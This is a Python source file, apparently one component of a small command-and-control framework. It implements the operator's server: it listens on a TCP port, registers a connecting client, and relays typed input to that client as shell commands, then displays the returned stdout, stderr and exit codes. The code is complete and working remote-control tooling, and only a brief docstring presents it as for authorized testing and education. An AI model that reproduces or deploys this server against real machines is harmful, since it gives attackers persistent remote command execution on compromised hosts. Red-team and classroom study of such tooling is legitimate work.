"""
C2 Server Implementation

This module implements the command and control server that:
- Accepts incoming client connections
- Receives client registration
- Provides an operator interface for sending commands
- Displays command results from clients

This is for authorized security testing and educational purposes only.
"""

import socket
import sys
from datetime import datetime
from typing import Optional, Tuple
from common import config, protocol


def display_banner():
    """
    Display the server startup banner with configuration info.
    """
    print("=" * 60)
    print("C2 SERVER - Command and Control System")
    print("=" * 60)
    print(f"Listening on: {config.SERVER_HOST}:{config.SERVER_PORT}")
    print(f"Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)
    print()


def start_server() -> Optional[Tuple[socket.socket, socket.socket]]:
    """
    Initialize and start the TCP server.

    Creates a TCP socket, binds to the configured host and port,
    and waits for a single client connection.

    Returns:
        tuple: (server_socket, client_socket) if successful
        None: If server startup or connection acceptance fails
    """
    try:
        # Create TCP socket
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Set socket options to reuse address (helpful for quick restarts)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Bind to configured address and port
        server_socket.bind((config.SERVER_HOST, config.SERVER_PORT))

        # Listen for incoming connections
        server_socket.listen(1)

        print(f"[*] Server listening on {config.SERVER_HOST}:{config.SERVER_PORT}")
        print("[*] Waiting for client connection...")
        print()

        # Accept a single client connection (blocking)
        client_socket, client_address = server_socket.accept()

        print(f"[+] Client connected from {client_address[0]}:{client_address[1]}")
        print()

        return server_socket, client_socket

    except PermissionError:
        print(f"[!] ERROR: Permission denied. Cannot bind to port {config.SERVER_PORT}")
        print("[!] Try using a port > 1024 or run with elevated privileges")
        return None
    except OSError as e:
        print(f"[!] ERROR: Failed to start server: {e}")
        return None
    except Exception as e:
        print(f"[!] ERROR: Unexpected error during server startup: {e}")
        return None


def handle_registration(client_socket: socket.socket) -> Optional[str]:
    """
    Handle client registration protocol.

    Receives and validates the registration message from the client,
    which should contain the client's ID/hostname and timestamp.

    Args:
        client_socket: The connected client socket

    Returns:
        str: The client_id if registration successful
        None: If registration fails
    """
    print("[*] Waiting for client registration...")

    try:
        # Receive registration message
        reg_message = protocol.receive_message(client_socket)

        if reg_message is None:
            print("[!] ERROR: Failed to receive registration message")
            return None

        # Validate message type
        if reg_message.get('type') != 'registration':
            print(f"[!] ERROR: Invalid message type: {reg_message.get('type')}")
            return None

        # Extract client information
        client_id = reg_message.get('client_id')
        timestamp = reg_message.get('timestamp')

        if not client_id:
            print("[!] ERROR: Registration missing client_id")
            return None

        # Display registration info
        print(f"[+] Client registered successfully!")
        print(f"    Client ID: {client_id}")
        print(f"    Timestamp: {timestamp}")
        print()

        return client_id

    except Exception as e:
        print(f"[!] ERROR: Registration failed: {e}")
        return None


def display_results(result_message: dict):
    """
    Display command execution results in a formatted way.

    Shows stdout, stderr, and return code clearly separated.

    Args:
        result_message: The result message dictionary from client
    """
    print()
    print("-" * 60)

    # Display command info
    command = result_message.get('command', 'Unknown')
    return_code = result_message.get('return_code', -1)
    print(f"Command: {command}")
    print(f"Return Code: {return_code}")
    print("-" * 60)

    # Display stdout
    stdout = result_message.get('stdout', '')
    if stdout:
        print("\n[STDOUT]:")
        print(stdout)
    else:
        print("\n[STDOUT]: (empty)")

    # Display stderr
    stderr = result_message.get('stderr', '')
    if stderr:
        print("\n[STDERR]:")
        print(stderr)
    else:
        print("\n[STDERR]: (empty)")

    print("-" * 60)
    print()


def display_help():
    """
    Display available operator commands.
    """
    print()
    print("Available Commands:")
    print("  help          - Show this help message")
    print("  exit, quit    - Close connection and exit server")
    print("  Any other input will be sent as a shell command to the client")
    print()


def operator_interface(client_socket: socket.socket, client_id: str):
    """
    Main operator interface loop.

    Provides an interactive command-line interface for the operator to:
    - Send commands to the client
    - View command results
    - Exit gracefully

    Args:
        client_socket: The connected client socket
        client_id: The registered client identifier
    """
    print("=" * 60)
    print(f"OPERATOR INTERFACE - Connected to: {client_id}")
    print("=" * 60)
    print("Type 'help' for available commands")
    print()

    try:
        while True:
            # Get command from operator
            try:
                command = input(f"C2 [{client_id}]> ").strip()
            except EOFError:
                # Handle Ctrl+D
                print()
                print("[*] EOF received. Exiting...")
                break

            # Handle empty input
            if not command:
                continue

            # Handle special commands
            if command.lower() in ['exit', 'quit']:
                print("[*] Closing connection and exiting...")
                break

            if command.lower() == 'help':
                display_help()
                continue

            # Send command to client
            command_message = {
                'type': 'command',
                'command': command
            }

            success = protocol.send_message(client_socket, command_message)

            if not success:
                print("[!] ERROR: Failed to send command to client")
                print("[!] Connection may be lost. Exiting...")
                break

            # Receive result from client
            result_message = protocol.receive_message(client_socket)

            if result_message is None:
                print("[!] ERROR: Failed to receive result from client")
                print("[!] Connection may be lost. Exiting...")
                break

            # Validate result message type
            if result_message.get('type') != 'result':
                print(f"[!] WARNING: Unexpected message type: {result_message.get('type')}")
                continue

            # Display results
            display_results(result_message)

    except KeyboardInterrupt:
        # Handle Ctrl+C
        print()
        print("[*] Keyboard interrupt received. Exiting...")
    except Exception as e:
        print(f"[!] ERROR: Unexpected error in operator interface: {e}")


def main():
    """
    Main entry point for the C2 server.

    Orchestrates the server startup, client registration, and operator interface.
    """
    # Display banner
    display_banner()

    # Start server and wait for client
    result = start_server()
    if result is None:
        print("[!] Server startup failed. Exiting.")
        sys.exit(1)

    server_socket, client_socket = result

    try:
        # Handle client registration
        client_id = handle_registration(client_socket)

        if client_id is None:
            print("[!] Client registration failed. Exiting.")
            client_socket.close()
            server_socket.close()
            sys.exit(1)

        # Start operator interface
        operator_interface(client_socket, client_id)

    finally:
        # Cleanup
        print()
        print("[*] Cleaning up...")
        try:
            client_socket.close()
            print("[*] Client connection closed")
        except:
            pass

        try:
            server_socket.close()
            print("[*] Server socket closed")
        except:
            pass

        print("[*] Server shutdown complete")


if __name__ == '__main__':
    main()
